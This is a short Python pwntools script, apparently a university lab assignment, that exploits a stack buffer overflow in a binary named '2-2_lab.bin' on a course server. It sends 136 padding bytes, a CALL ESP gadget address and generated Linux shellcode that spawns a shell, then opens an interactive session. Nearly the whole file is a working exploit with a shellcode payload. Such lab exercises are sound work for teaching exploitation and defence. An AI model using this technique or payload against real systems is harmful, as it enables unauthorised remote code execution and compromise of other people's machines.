from pwn import *

context.arch="x86_64"                           # Set the architecture to x86_64

''' Define Constants '''
CALL_ESP = 0x00401259                           # Set CALL ESP Address
SHELLCODE = asm(shellcraft.amd64.linux.sh())    # Generate shellcode

''' Establish Connection '''
p = remote("csc748.hostbin.org", 7022)          # Test Script Against Server
# p = process("./2-2_lab.bin")                  # Uncomment to Test Script Locally
# p = gdb.debug("./2-2_lab.bin")                # Uncomment to debug GDB

''' Exploit Vulnerability '''
p.sendline(b"A"*136 + 
           p64(CALL_ESP) + 
           SHELLCODE + 
           b"\n")                               # Fill Buffer and Send Packed Target
p.interactive()                                 # Start Interactive Session
